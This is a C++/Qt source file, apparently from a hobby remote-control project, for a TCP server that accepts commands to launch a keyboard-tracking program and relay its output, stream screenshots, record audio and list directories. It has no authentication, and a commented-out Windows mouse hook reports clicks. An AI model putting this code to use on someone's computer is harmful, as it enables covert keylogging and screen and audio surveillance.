
#include "server.h"
#include "keyboard_track.h"

#include <QDebug>
#include <QApplication>
#include <QScreen>

Server::Server(QObject *parent)
    : QObject{parent}
{
    initServer();
    connect(tcpServer, &QTcpServer::newConnection, this, &Server::newConnection);
}

void Server::initServer()
{
    tcpServer = new QTcpServer(this);
    if (!tcpServer->listen()) {
//        QMessageBox::critical(this, tr("Fortune Server"),
//                              tr("Unable to start the server: %1.")
//                                  .arg(tcpServer->errorString()));
        qDebug() << "Unable to start server.";
        return;
    }

    const QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();
    // use the first non-localhost IPv4 address
    for (const QHostAddress &entry : ipAddressesList) {
        if (entry != QHostAddress::LocalHost && entry.toIPv4Address()) {
            ipAddress = entry.toString();
            break;
        }
    }
    // if we did not find one, use IPv4 localhost
    if (ipAddress.isEmpty())
        ipAddress = QHostAddress(QHostAddress::LocalHost).toString();

    //! [1]
    port = QString::number(tcpServer->serverPort());
}

void Server::sendMessage(const QString &msg)
{
    if (!curClient) return;
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("string") << msg;
    curClient->write(block);
}

void Server::sendScreenshot(const QPixmap &screenshot) {
    if (!curClient) return;

    QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

//    out << tr("image") << screenshot;
//    curClient->write(block);
    QByteArray byteArray;
    QBuffer buffer(&byteArray);
    buffer.open(QIODevice::WriteOnly);
    resizedScreenshot.save(&buffer, "PNG");
    out << tr("image") << byteArray;
    curClient->write(block);
}

void Server::sendFileStructure(const QFileSystemModel &model) {
    if (!curClient) return;
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    QVariantList modelData;
//    modelData.append(model.rootPath());
//    for (int row = 0; row < model.rowCount(); ++row) {
//        QVariantMap rowData;
//        QModelIndex index = model.index(row, 0);
//        rowData["fileName"] = model.fileName(index);
//        rowData["filePath"] = model.filePath(index);
//        rowData["fileSize"] = model.size(index);
//        rowData["fileType"] = model.type(index);
//        rowData["fileDateTime"] = model.fileTime(index);
//        modelData.append(rowData);
//    }

//    out << tr("file model") << model;
    // Send the QByteArray over the network, e.g. via a QTcpSocket
    curClient->write(block);
}


void Server::readMessage() {
    qDebug() << "A message just got to server!";

    in.startTransaction();

    QString message;
    in >> message;

    if (!in.commitTransaction())
        return;

//    statusLabel->setText(message);

    if (message == tr("list applications")) {
        sendMessage("here are the applications: ");
//        tracking_keyboard();
    }
    else if (message == tr("list processes")) {
        sendMessage("here are the processes: ");

//        startHook();
    }
    else if (message == tr("keyboard track")) {
        qDebug() << "keyboard tracking started?";
        m_process = new QProcess();
        m_process->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\keyboard_track.exe");
        connect(m_process, &QProcess::readyReadStandardOutput, this, &Server::processData);
    }
    else if (message == tr("take screenshot")) {
        qDebug() << "taken screenshot";
//        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
////        emit(display(screenshot));
//        sendScreenshot(screenshot);
        QTimer *timer = new QTimer(this);
        connect(timer, &QTimer::timeout, this, &Server::stream);
        timer->start();
        QTimer::singleShot(3000, timer, &QTimer::stop);
    }
    else if (message == tr("show directories")) {
        qDebug() << "show directories";
        QFileSystemModel model;
        model.setRootPath("C:\\");
        sendFileStructure(model);
    }
    else if (message == tr("recording")){
        if (recorder == nullptr)
            recorder = new AudioRecorder;
        recorder->show();

        recorder->auto_start();
    }
    else if (message == tr("stop_recording")){
        recorder->stop_by_msg();
        delete recorder;
    }

    emit(readyRead(message));
}

void Server::stream() {
    QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
    //        emit(display(screenshot));
    sendScreenshot(screenshot);
}

void Server::processData() {
    qDebug() << "is this on?";
    QString data = m_process->readAllStandardOutput();
    sendMessage(data);
}

void Server::newConnection() {
    QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
    connect(clientConnection, &QTcpSocket::readyRead, this, &Server::readMessage);

    curClient = clientConnection;
    in.setDevice(clientConnection);
    in.setVersion(QDataStream::Qt_6_5);
}

//LRESULT CALLBACK Server::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
//    // Check if the message is a mouse click event
//    if (nCode < HC_ACTION)
//        return CallNextHookEx(NULL, nCode, wParam, lParam);

//    std::string eventType = "";

//    if (wParam == WM_MOUSEMOVE || wParam == WM_LBUTTONDOWN ||
//        wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
//        // Extract the mouse coordinates from the LPARAM
//        POINT cursorPos;
//        GetCursorPos(&cursorPos);

//        // Print the mouse coordinates to the console
//        switch (wParam)
//        {
//        case WM_MOUSEMOVE:
//            eventType = "move";
//            break;
//        case WM_LBUTTONDOWN:
//            eventType = "lclick";
//            break;
//        case WM_RBUTTONDOWN:
//            eventType = "rclick";
//            break;
//        case WM_MBUTTONDOWN:
//            eventType = "mclick";
//            break;
//        }

//        std::stringstream ss;
//        ss << eventType << " at ("
//                  << cursorPos.x << ", "
//                  << cursorPos.y << ")\n";
//        QString data = QString::fromStdString(ss.str());
//        sendMessage(data);
//    }
//    else if (wParam == WM_MOUSEWHEEL || wParam == WM_MOUSEHWHEEL) {
//        eventType = "wheel";

//        switch (wParam)
//        {
//        case WM_MOUSEWHEEL:
//            eventType = "vwheel";
//            break;
//        case WM_MOUSEHWHEEL:
//            eventType = "hwheel";
//            break;
//        }

//        MSLLHOOKSTRUCT* pMhs = (MSLLHOOKSTRUCT*)lParam;
//        short zDelta = HIWORD(pMhs->mouseData);

//        int scrollAmount = GET_WHEEL_DELTA_WPARAM(wParam);
//        if (scrollAmount != 0)
//            std::cout << eventType << " " << scrollAmount << " units\n";

//        // Convert the scroll amount to lines or pages depending on the scroll bar orientation
//        // int scrollLines = scrollAmount / WHEEL_DELTA;
//        // int scrollPages = scrollAmount / (WHEEL_DELTA * 3);

//        // Print out the scroll distance
//        std::cout << eventType << " " << zDelta << " units\n";
//    }

//    // Call the next hook in the chain
//    return CallNextHookEx(NULL, nCode, wParam, lParam);
//}

//void Server::startHook() {
//    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
//    if (mouseHook == NULL) {
//        std::cerr << "Failed to set mouse hook.\n";
//    }
//}

//void Server::stopHook() {
//    if (mouseHook != NULL) {
//        UnhookWindowsHookEx(mouseHook);
//    }
//}


